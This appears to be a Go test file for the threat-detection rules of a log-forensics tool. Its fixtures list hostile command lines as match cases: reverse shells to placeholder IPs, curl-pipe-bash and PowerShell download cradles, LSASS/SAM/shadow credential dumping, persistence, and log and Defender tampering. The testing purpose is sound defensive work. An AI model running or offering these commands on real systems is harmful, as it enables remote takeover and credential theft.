package detect

import (
	"context"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/ciruzz00/astro/internal/logs"
	"github.com/ciruzz00/astro/internal/logs/access"
	"github.com/ciruzz00/astro/internal/logs/syslog"
	"github.com/ciruzz00/astro/internal/logs/utmp"
	"github.com/ciruzz00/astro/internal/store"
)

var t0 = time.Date(2026, 10, 11, 21, 0, 0, 0, time.UTC)

func TestCommandRules(t *testing.T) {
	tests := []struct {
		rule string
		hits []string
		miss []string
	}{
		{"cmd-reverse-shell", []string{"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "nc -e /bin/sh 203.0.113.9 4444",
			"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f",
			`python3 -c 'import socket,subprocess,os;s=socket.socket()'`},
			[]string{"nc -zv example.com 80", "bash -c 'echo hi'"}},
		{"cmd-download-exec", []string{"curl -s http://198.51.100.7/x.sh | bash", "wget -qO- http://198.51.100.7/i | sudo sh"},
			[]string{"curl -s http://example.com/api | jq .", "wget http://example.com/a.tar.gz"}},
		{"cmd-download-tmp", []string{"wget http://198.51.100.7/a -O /tmp/a", "curl -o /dev/shm/k http://198.51.100.7/k"},
			[]string{"curl -o report.html https://example.com/"}},
		{"cmd-exec-tmp", []string{"chmod +x /tmp/a", "chmod 755 /dev/shm/k"}, []string{"chmod 644 /tmp/a", "chmod +x ./build.sh"}},
		{"cmd-base64-exec", []string{"echo aWQ= | base64 -d | sh"}, []string{"echo aWQ= | base64 -d"}},
		{"ps-encoded", []string{"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"},
			[]string{"powershell -ExecutionPolicy Bypass -File update.ps1"}},
		{"ps-download-cradle", []string{"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"},
			[]string{"Get-Process | Sort-Object CPU"}},
		{"lolbin-certutil", []string{"certutil.exe -urlcache -split -f http://198.51.100.7/a.exe a.exe", "certutil -decode a.b64 a.exe"},
			[]string{"certutil -hashfile setup.exe SHA256"}},
		{"lolbin-bitsadmin", []string{`bitsadmin /transfer job http://198.51.100.7/a.exe C:\a.exe`}, []string{"bitsadmin /list"}},
		{"lolbin-proxy-exec", []string{"mshta http://198.51.100.7/a.hta", "regsvr32 /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"},
			[]string{"regsvr32 /s mydll.dll"}},
		{"cred-sam-dump", []string{`reg save HKLM\SAM C:\temp\sam`, `reg.exe save "HKLM\SECURITY" s.hiv`},
			[]string{`reg query HKLM\SOFTWARE\Microsoft`}},
		{"cred-lsass-dump", []string{`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\l.dmp full`, "procdump64.exe -ma lsass.exe l.dmp", "sekurlsa::logonpasswords"},
			[]string{"procdump -ma notepad.exe"}},
		{"cred-ntds", []string{`ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`, "vssadmin create shadow /for=C:"},
			[]string{"vssadmin list shadows"}},
		{"cred-linux-shadow", []string{"cat /etc/shadow", "cp /etc/shadow /tmp/s"}, []string{"cat /etc/hostname", "passwd alice"}},
		{"privesc-potato", []string{"JuicyPotato.exe -l 1337 -p c:\\x.exe", "PrintSpoofer64.exe -i -c cmd"}, []string{"potato salad"}},
		{"privesc-suid", []string{"chmod u+s /bin/bash", "chmod 4755 /tmp/sh"}, []string{"chmod 755 /usr/local/bin/tool"}},
		{"persist-ssh-key", []string{"echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys"}, []string{"cat ~/.ssh/authorized_keys"}},
		{"persist-cron", []string{"crontab -e", `echo "* * * * * root /tmp/x" >> /etc/crontab`, "crontab /tmp/jobs"},
			[]string{"crontab -l"}},
		{"persist-systemd", []string{"systemctl enable evil.service", "cat x > /etc/systemd/system/evil.service"},
			[]string{"systemctl status nginx"}},
		{"persist-shell-rc", []string{"echo 'nc 203.0.113.9 4444 -e /bin/sh' >> ~/.bashrc"}, []string{"cat ~/.bashrc"}},
		{"persist-schtasks", []string{`schtasks /create /tn upd /tr c:\x.exe /sc minute`}, []string{"schtasks /query"}},
		{"persist-sc-create", []string{`sc.exe create evil binPath= "cmd /c x"`}, []string{"sc query spooler"}},
		{"persist-run-key", []string{`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d c:\x.exe`},
			[]string{`reg add HKCU\Software\Example /v x /d 1`}},
		{"account-add", []string{"net user backdoor P@ssw0rd /add", "useradd -m eve"}, []string{"net user", "net user alice"}},
		{"account-admin", []string{"net localgroup administrators backdoor /add", "usermod -aG sudo eve", "gpasswd -a eve docker"},
			[]string{"usermod -s /bin/bash eve", "net localgroup administrators"}},
		{"evasion-clear-history", []string{"history -c", "unset HISTFILE", "rm ~/.bash_history"}, []string{"history | tail"}},
		{"evasion-clear-logs", []string{"rm -rf /var/log/auth.log", "wevtutil cl Security", "> /var/log/wtmp"},
			[]string{"wevtutil qe Security", "cat /var/log/syslog", "tail -f /var/log/nginx/access.log"}},
		{"evasion-defender", []string{"Set-MpPreference -DisableRealtimeMonitoring $true"}, []string{"Get-MpPreference"}},
		{"evasion-firewall", []string{"netsh advfirewall set allprofiles state off", "ufw disable"}, []string{"ufw status"}},
		{"impact-shadow-delete", []string{"vssadmin delete shadows /all /quiet", "bcdedit /set {default} recoveryenabled No"},
			[]string{"vssadmin list shadows"}},
		{"lateral-psexec", []string{`PsExec64.exe \\host -s cmd`}, []string{"exec ps"}},
		{"discovery-domain", []string{`net group "domain admins" /domain`, "nltest /dclist:example.local"}, []string{"net group"}},
		{"discovery-privileges", []string{"whoami /priv", "sudo -l"}, []string{"whoami"}},
		{"discovery-tools", []string{"./linpeas.sh", "nmap -sV 10.0.0.0/24"}, []string{"ls -la"}},
	}
	byID := map[string]commandRule{}
	for _, r := range commandRules {
		byID[r.ID] = r
	}
	if len(byID) != len(commandRules) {
		t.Fatal("duplicate rule ids")
	}
	tested := map[string]bool{}
	for _, tt := range tests {
		r, ok := byID[tt.rule]
		if !ok {
			t.Errorf("unknown rule %s", tt.rule)
			continue
		}
		tested[tt.rule] = true
		for _, c := range tt.hits {
			if !r.re.MatchString(c) {
				t.Errorf("%s: should match %q", tt.rule, c)
			}
		}
		for _, c := range tt.miss {
			if r.re.MatchString(c) {
				t.Errorf("%s: should not match %q", tt.rule, c)
			}
		}
	}
	for id := range byID {
		if !tested[id] && id != "ps-decode" && id != "ps-hidden" {
			t.Errorf("rule %s has no test", id)
		}
	}
}

// run feeds events (ids assigned in order) and returns the findings by rule.
func run(evs []logs.Event) (map[string][]logs.Finding, Result) {
	en := New()
	for i := range evs {
		evs[i].ID = int64(i + 1)
		en.Observe(&evs[i])
	}
	res := en.Finish()
	out := map[string][]logs.Finding{}
	for _, f := range res.Findings {
		out[f.RuleID] = append(out[f.RuleID], f)
	}
	return out, res
}

func sshFailed(i int, ip, user string) logs.Event {
	return logs.Event{Time: t0.Add(time.Duration(i) * 10 * time.Second), Host: "web01", Kind: syslog.KindSSHFailed, User: user, SrcIP: ip,
		Message: "SSH login failed for " + user + " from " + ip}
}

func TestBruteForceThenSuccess(t *testing.T) {
	var evs []logs.Event
	for i := range 12 {
		evs = append(evs, sshFailed(i, "203.0.113.9", "root"))
	}
	evs = append(evs, logs.Event{Time: t0.Add(3 * time.Minute), Host: "web01", Kind: syslog.KindSSHAccepted, User: "root", SrcIP: "203.0.113.9",
		Message: "SSH login accepted for root from 203.0.113.9 (password)"})
	// Noise from another address that stays under the threshold.
	for i := range 3 {
		evs = append(evs, sshFailed(20+i, "198.51.100.7", "admin"))
	}
	got, res := run(evs)
	brute := got["auth-brute-force"]
	if len(brute) != 1 || brute[0].Count != 12 || brute[0].SrcIP != "203.0.113.9" || brute[0].Severity != logs.High || len(brute[0].EventIDs) != 12 ||
		!strings.Contains(brute[0].Summary, "12 failed logins from 203.0.113.9") {
		t.Errorf("brute force = %+v", brute)
	}
	succ := got["auth-success-after-brute-force"]
	if len(succ) != 1 || succ[0].Severity != logs.Critical || succ[0].User != "root" || !strings.Contains(succ[0].Summary, "after 12 failed attempts") {
		t.Errorf("success = %+v", succ)
	}
	if res.Raise[13] != logs.Critical || res.Raise[1] != logs.High || res.Raise[14] != 0 {
		t.Errorf("raise = %v", res.Raise)
	}
	if got["linux-root-ssh"] == nil {
		t.Error("root ssh login not reported")
	}
	if res.Findings[0].Severity != logs.Critical {
		t.Errorf("findings not sorted: %+v", res.Findings[0])
	}
}

func TestRepeatedMessagesCount(t *testing.T) {
	e := sshFailed(0, "203.0.113.9", "root")
	e.Fields = map[string]string{"repeated": "15"}
	got, _ := run([]logs.Event{e})
	if b := got["auth-brute-force"]; len(b) != 1 || !strings.Contains(b[0].Summary, "15 failed logins") {
		t.Errorf("repeated = %+v", b)
	}
}

func winEvent(id int, offset time.Duration, fields map[string]string) logs.Event {
	e := logs.Event{Time: t0.Add(offset), Host: "DC01", Kind: "windows-event", EventID: id, Provider: "Microsoft-Windows-Security-Auditing",
		Channel: "Security", Fields: fields, Message: "event " + strconv.Itoa(id)}
	e.User = fields["TargetUserName"]
	if e.User == "" {
		e.User = fields["SubjectUserName"]
	}
	e.SrcIP = fields["IpAddress"]
	e.CommandLine = fields["CommandLine"]
	return e
}

func TestWindowsRules(t *testing.T) {
	var evs []logs.Event
	for i, u := range []string{"alice", "bob", "carol", "dave", "erin", "frank"} {
		evs = append(evs, winEvent(4625, time.Duration(i)*time.Second, map[string]string{"TargetUserName": u, "IpAddress": "203.0.113.9"}))
	}
	evs = append(evs,
		winEvent(4624, time.Minute, map[string]string{"TargetUserName": "erin", "IpAddress": "203.0.113.9", "LogonType": "3"}),
		winEvent(4732, 2*time.Minute, map[string]string{"TargetUserName": "Administrators", "SubjectUserName": "erin", "MemberSid": "S-1-5-21-1-2-3-1105"}),
		winEvent(4732, 3*time.Minute, map[string]string{"TargetUserName": "Print users", "SubjectUserName": "erin"}),
		winEvent(4688, 4*time.Minute, map[string]string{"SubjectUserName": "erin", "CommandLine": `reg save HKLM\SYSTEM C:\temp\s`}),
		winEvent(4662, 5*time.Minute, map[string]string{"SubjectUserName": "erin", "Properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"}),
		winEvent(4662, 5*time.Minute, map[string]string{"SubjectUserName": "DC02$", "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"}),
		winEvent(4768, 6*time.Minute, map[string]string{"TargetUserName": "svc_sql", "PreAuthType": "0"}),
	)
	for i, svc := range []string{"MSSQLSvc/db01", "HTTP/web01", "CIFS/files01", "DC01$"} {
		evs = append(evs, winEvent(4769, 7*time.Minute+time.Duration(i)*time.Second,
			map[string]string{"TargetUserName": "erin", "ServiceName": svc, "TicketEncryptionType": "0x17"}))
	}
	evs = append(evs,
		winEvent(4732, 10*time.Minute, map[string]string{"TargetUserName": "Administrators", "SubjectUserName": "WS01$", "MemberSid": "S-1-5-21-1-2-3-500"}),
		winEvent(4720, 10*time.Minute, map[string]string{"TargetUserName": "defaultuser0", "SubjectUserName": "WS01$"}),
	)
	for i := range 12 { // a computer account with a stale password
		evs = append(evs, winEvent(4625, 11*time.Minute+time.Duration(i)*time.Second, map[string]string{"TargetUserName": "WS02$", "IpAddress": "192.0.2.20"}))
	}
	drv := winEvent(7045, 12*time.Minute, map[string]string{"ServiceName": "vmhgfs"})
	drv.Provider, drv.CommandLine = "Service Control Manager", `\SystemRoot\System32\drivers\vmhgfs.sys`
	def := winEvent(7045, 12*time.Minute, map[string]string{"ServiceName": "MpKsl1"})
	def.Provider, def.CommandLine = "Service Control Manager", `C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{X}\MpKsl1.sys`
	wmi := winEvent(10, 12*time.Minute, map[string]string{"TargetImage": `C:\Windows\system32\lsass.exe`, "SourceImage": `C:\Windows\system32\wbem\wmiprvse.exe`, "GrantedAccess": "0x1410"})
	wmi.Provider = "Microsoft-Windows-Sysmon"
	dump := wmi
	dump.Fields = map[string]string{"TargetImage": `C:\Windows\system32\lsass.exe`, "SourceImage": `C:\Users\x\AppData\Local\Temp\p.exe`, "GrantedAccess": "0x1fffff"}
	evs = append(evs, drv, def, wmi, dump)
	cleared := winEvent(1102, 8*time.Minute, map[string]string{"SubjectUserName": "erin"})
	cleared.Provider = "Microsoft-Windows-Eventlog"
	svc := winEvent(7045, 9*time.Minute, map[string]string{"ServiceName": "upd"})
	svc.Provider, svc.CommandLine = "Service Control Manager", `%COMSPEC% /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi`
	evs = append(evs, cleared, svc)

	got, _ := run(evs)
	want := map[string]logs.Severity{
		"auth-password-spray": logs.High, "auth-success-after-brute-force": logs.Critical, "win-admin-group": logs.High,
		"cred-sam-dump": logs.Critical, "win-dcsync": logs.Critical, "win-asrep-roast": logs.High, "win-kerberoasting": logs.High,
		"win-log-cleared": logs.Critical, "win-service-installed": logs.Medium, "win-service-suspicious": logs.High, "ps-encoded": logs.High,
	}
	for id, sev := range want {
		if f := got[id]; len(f) != 1 || f[0].Severity != sev {
			t.Errorf("%s = %+v", id, f)
		}
	}
	if k := got["win-kerberoasting"]; len(k) == 1 && k[0].Count != 3 {
		t.Errorf("kerberoasting counted %d tickets, want 3 (machine accounts excluded)", k[0].Count)
	}
	if d := got["win-dcsync"]; len(d) == 1 && d[0].User != "erin" {
		t.Errorf("dcsync by a domain controller reported: %+v", d)
	}
	if got["auth-brute-force"] != nil {
		t.Errorf("brute force reported for 6 failures or a computer account: %+v", got["auth-brute-force"])
	}
	for _, id := range []string{"win-admin-group-by-system", "win-user-created-by-system", "win-lsass-access"} {
		if f := got[id]; len(f) != 1 || f[0].Count != 1 {
			t.Errorf("%s = %+v", id, f)
		}
	}
	if f := got["win-service-installed"]; len(f) != 1 || f[0].Count != 2 {
		t.Errorf("services (drivers excluded, one finding per host) = %+v", f)
	}
	if f := got["win-service-suspicious"]; len(f) != 1 || f[0].Count != 1 {
		t.Errorf("suspicious services (Defender excluded) = %+v", f)
	}
}

func TestLinuxAndWebRules(t *testing.T) {
	ev := func(kind string, f map[string]string) logs.Event {
		return logs.Event{Time: t0, Host: "web01", Kind: kind, Fields: f, User: f["user"], SrcIP: f["ip"], CommandLine: f["cmd"], Message: kind}
	}
	evs := []logs.Event{
		ev(syslog.KindUserCreated, map[string]string{"user": "backdoor", "uid": "1001", "shell": "/bin/bash"}),
		ev(syslog.KindUserCreated, map[string]string{"user": "sshd", "uid": "122", "shell": "/usr/sbin/nologin"}),
		ev(syslog.KindUserCreated, map[string]string{"user": "toor", "uid": "0", "shell": "/bin/bash"}),
		ev(access.KindRequest, map[string]string{"ip": "127.0.0.1", "path": "/health", "user_agent": "curl/7.74.0", "status": "200"}),
		ev(syslog.KindGroupMember, map[string]string{"user": "backdoor", "group": "sudo"}),
		ev(syslog.KindGroupMember, map[string]string{"user": "alice", "group": "audio"}),
		ev(syslog.KindSudo, map[string]string{"user": "alice", "cmd": "/bin/bash"}),
		ev(syslog.KindSudo, map[string]string{"user": "alice", "cmd": "/usr/bin/apt update"}),
		ev(syslog.KindSudo, map[string]string{"user": "alice", "cmd": "/usr/bin/find . -exec /bin/sh \\;"}),
		ev(syslog.KindSudoDenied, map[string]string{"user": "eve", "cmd": "/bin/sh"}),
		ev(logs.KindNULPadding, map[string]string{"nul_bytes": "811"}),
		ev("shell-command", map[string]string{"user": "root", "cmd": "curl -s http://198.51.100.7/x.sh | bash"}),
		ev(access.KindRequest, map[string]string{"ip": "203.0.113.9", "path": "/index.php?page=../../../../etc/passwd", "user_agent": "Mozilla/5.0", "status": "200"}),
		ev(access.KindRequest, map[string]string{"ip": "203.0.113.9", "path": "/", "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "status": "200"}),
		ev(access.KindRequest, map[string]string{"ip": "198.51.100.7", "path": "/api", "user_agent": "python-requests/2.31.0", "status": "200"}),
		ev(access.KindRequest, map[string]string{"ip": "192.0.2.10", "path": "/search?q=hello", "user_agent": "Mozilla/5.0", "status": "200"}),
	}
	for i := range 120 {
		e := ev(access.KindRequest, map[string]string{"ip": "203.0.113.50", "path": "/admin" + strconv.Itoa(i), "user_agent": "Mozilla/5.0", "status": "404"})
		e.Time = t0.Add(time.Duration(i) * time.Second)
		evs = append(evs, e)
	}
	got, _ := run(evs)
	wantCount := map[string]int{
		"linux-user-created": 1, "linux-uid0-user": 1, "linux-admin-group": 1, "linux-root-shell": 2, "linux-sudo-denied": 1, "log-truncated": 1,
		"cmd-download-exec": 1, "web-attack": 1, "web-scanner": 1, "web-scripted-client": 1,
	}
	for id, n := range wantCount {
		total := 0
		for _, f := range got[id] {
			total += f.Count
		}
		if total != n {
			t.Errorf("%s matched %d events, want %d (%+v)", id, total, n, got[id])
		}
	}
	if b := got["web-content-discovery"]; len(b) != 1 || b[0].Count != 120 || !strings.Contains(b[0].Summary, "203.0.113.50") {
		t.Errorf("content discovery = %+v", b)
	}
	if w := got["web-attack"]; len(w) == 1 && w[0].Summary != "GET /index.php?page=../../../../etc/passwd → 200" && !strings.Contains(w[0].Summary, "etc/passwd") {
		t.Errorf("web attack summary = %q", w[0].Summary)
	}
}

func TestBtmpAndWtmpCorrelate(t *testing.T) {
	var evs []logs.Event
	for i := range 10 {
		evs = append(evs, logs.Event{Time: t0.Add(time.Duration(i) * time.Second), Kind: utmp.KindLoginFailed, User: "admin", SrcIP: "203.0.113.9"})
	}
	evs = append(evs, logs.Event{Time: t0.Add(time.Minute), Kind: utmp.KindLogin, User: "admin", SrcIP: "203.0.113.9", Message: "login of admin"})
	got, _ := run(evs)
	if got["auth-brute-force"] == nil || got["auth-success-after-brute-force"] == nil {
		t.Errorf("findings = %v", got)
	}
}

func TestAnalyzeStoresFindings(t *testing.T) {
	ctx := context.Background()
	st, err := store.Open(ctx, filepath.Join(t.TempDir(), "astro.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	if err := st.CreateCase(ctx, store.Case{Name: "inc-1", TLP: "AMBER"}, t0); err != nil {
		t.Fatal(err)
	}
	evID, err := st.AddEvidence(ctx, "inc-1", store.Evidence{Path: "/e/auth.log", Name: "auth.log", Kind: logs.KindSyslog, SHA256: "x"}, "analyst", "", t0)
	if err != nil {
		t.Fatal(err)
	}
	caseID, _ := st.CaseID(ctx, "inc-1")
	var evs []*logs.Event
	for i := range 11 {
		e := sshFailed(i, "203.0.113.9", "root")
		e.Source, e.Seq = "auth.log", int64(i+1)
		evs = append(evs, &e)
	}
	if err := st.InsertEvents(ctx, caseID, evID, evs); err != nil {
		t.Fatal(err)
	}
	for range 2 { // running twice gives the same findings
		res, err := Analyze(ctx, st, "inc-1", t0)
		if err != nil || len(res.Findings) != 1 {
			t.Fatalf("Analyze = %+v, %v", res.Findings, err)
		}
	}
	fs, err := st.Findings(ctx, "inc-1")
	if err != nil || len(fs) != 1 || fs[0].RuleID != "auth-brute-force" || fs[0].Count != 11 || len(fs[0].EventIDs) != 11 || fs[0].Technique != "T1110" {
		t.Fatalf("stored findings = %+v, %v", fs, err)
	}
	high, total, _ := st.Events(ctx, "inc-1", store.EventFilter{MinSeverity: logs.High})
	if total != 11 || len(high) != 11 {
		t.Errorf("events raised to high = %d", total)
	}
	cited, err := st.EventsByID(ctx, "inc-1", fs[0].EventIDs[:2])
	if err != nil || len(cited) != 2 || cited[0].Kind != syslog.KindSSHFailed {
		t.Errorf("EventsByID = %+v, %v", cited, err)
	}
}

func TestIndicators(t *testing.T) {
	fs := []logs.Finding{
		{Severity: logs.High, SrcIP: "203.0.113.9", Summary: "curl -s http://198.51.100.7/x.sh | bash · wget https://evil.example.com/a"},
		{Severity: logs.Critical, SrcIP: "203.0.113.9", Summary: "T1059.001 run by alice@example.com"},
		{Severity: logs.Low, SrcIP: "192.0.2.77", Summary: "curl/8.5.0"},
	}
	var got []string
	for _, i := range Indicators(fs) {
		got = append(got, i.String())
	}
	want := "ipv4:203.0.113.9 url:http://198.51.100.7/x.sh url:https://evil.example.com/a"
	if strings.Join(got, " ") != want {
		t.Errorf("Indicators = %v, want %s", got, want)
	}
}

func FuzzObserve(f *testing.F) {
	f.Add("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "ssh-failed", 4625, "203.0.113.9", "3")
	f.Add("/index.php?page=../../etc/passwd", access.KindRequest, 0, "198.51.100.7", "")
	f.Fuzz(func(t *testing.T, text, kind string, id int, ip, extra string) {
		en := New()
		for i := range 3 {
			e := logs.Event{ID: int64(i + 1), Time: t0.Add(time.Duration(i) * time.Second), Kind: kind, EventID: id, SrcIP: ip, User: extra,
				Provider: "Microsoft-Windows-Security-Auditing", CommandLine: text, Message: text,
				Fields: map[string]string{"path": text, "user_agent": text, "repeated": extra, "LogonType": extra, "status": extra,
					"TicketEncryptionType": "0x17", "ServiceName": text, "TargetUserName": extra}}
			en.Observe(&e)
		}
		for _, f := range en.Finish().Findings {
			if f.RuleID == "" || f.Count == 0 {
				t.Fatalf("bad finding %+v", f)
			}
		}
	})
}
